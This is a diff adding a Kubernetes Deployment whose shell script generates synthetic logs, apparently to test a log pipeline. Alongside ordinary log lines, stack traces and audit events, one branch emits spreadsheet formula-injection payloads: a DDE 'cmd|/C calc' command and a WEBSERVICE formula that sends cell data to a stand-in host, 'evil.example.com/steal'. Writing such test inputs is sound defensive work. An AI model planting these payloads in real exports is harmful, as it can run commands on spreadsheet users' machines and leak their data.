@@ -1,0 +1,98 @@
+---
+apiVersion: apps/v1
+kind: Deployment
+metadata:
+  name: log-generator
+  namespace: log-9015-numeric-sorting
+  labels:
+    app.kubernetes.io/name: log-generator
+    app.kubernetes.io/part-of: log-9015
+spec:
+  replicas: 1
+  selector:
+    matchLabels:
+      app.kubernetes.io/name: log-generator
+      app.kubernetes.io/part-of: log-9015
+  template:
+    metadata:
+      labels:
+        app.kubernetes.io/name: log-generator
+        app.kubernetes.io/part-of: log-9015
+    spec:
+      containers:
+        - name: log-generator
+          image: registry.access.redhat.com/ubi9/ubi-minimal
+          imagePullPolicy: IfNotPresent
+          resources:
+            requests:
+              cpu: 10m
+              memory: 32Mi
+            limits:
+              cpu: 50m
+              memory: 64Mi
+          command:
+            - /bin/sh
+            - -c
+            - |
+              LEVELS="critical error warning info debug"
+              pick_level() {
+                set -- $LEVELS
+                shift $((RANDOM % 5))
+                echo "$1"
+              }
+
+              CSV_PAYLOADS='=cmd|/C calc!A0
+              +cmd|/C calc!A0
+              -1+1
+              @SUM(A1:A2)
+              =HYPERLINK("http://evil.example.com","Click")
+              =IMPORTXML("http://evil.example.com","//a")
+              =WEBSERVICE("http://evil.example.com/steal?d="&A1)
+              =1+1
+              +1+1
+              @SUM(A1:A100)'
+
+              pick_csv_payload() {
+                echo "$CSV_PAYLOADS" | sed 's/^[[:space:]]*//' | awk "NR==$((RANDOM % 10 + 1))"
+              }
+
+              burst=0
+              while true; do
+                burst=$((burst + 1))
+                seq=1
+                while [ $seq -le 50 ]; do
+                  level=$(pick_level)
+                  roll=$((RANDOM % 20))
+                  if [ $roll -lt 10 ]; then
+                    printf 'level=%s burst=%04d seq=%03d msg=log-generator-line\n' "$level" "$burst" "$seq"
+                  elif [ $roll -lt 14 ]; then
+                    printf 'level=%s burst=%04d seq=%03d msg=exception-thrown\n' "$level" "$burst" "$seq"
+                    printf 'java.lang.NullPointerException: value was null\n'
+                    printf '  at com.example.service.OrderProcessor.validate(OrderProcessor.java:142)\n'
+                    printf '  at com.example.service.OrderProcessor.process(OrderProcessor.java:87)\n'
+                    printf '  at com.example.api.OrderController.submit(OrderController.java:53)\n'
+                    printf '  at sun.reflect.NativeMethodAccessorImpl.invoke(NativeMethodAccessorImpl.java:62)\n'
+                  elif [ $roll -lt 17 ]; then
+                    printf 'level=%s burst=%04d seq=%03d msg=audit-event\n' "$level" "$burst" "$seq"
+                    printf '{\n'
+                    printf '  "event": "user.login",\n'
+                    printf '  "user": "admin@example.com",\n'
+                    printf '  "source_ip": "10.0.%d.%d",\n' "$((RANDOM % 256))" "$((RANDOM % 256))"
+                    printf '  "status": "success",\n'
+                    printf '  "timestamp": "%s"\n' "$(date -u +%Y-%m-%dT%H:%M:%SZ)"
+                    printf '}\n'
+                  else
+                    payload=$(pick_csv_payload)
+                    printf 'level=%s burst=%04d seq=%03d msg=csv-injection-test payload=%s\n' "$level" "$burst" "$seq" "$payload"
+                    printf '%s\n' "$payload"
+                    if [ $((RANDOM % 3)) -eq 0 ]; then
+                      printf '\tcalc.exe\n'
+                    fi
+                    if [ $((RANDOM % 3)) -eq 0 ]; then
+                      printf '\rcalc.exe\n'
+                    fi
+                  fi
+                  seq=$((seq + 1))
+                done
+                sleep 2
+              done
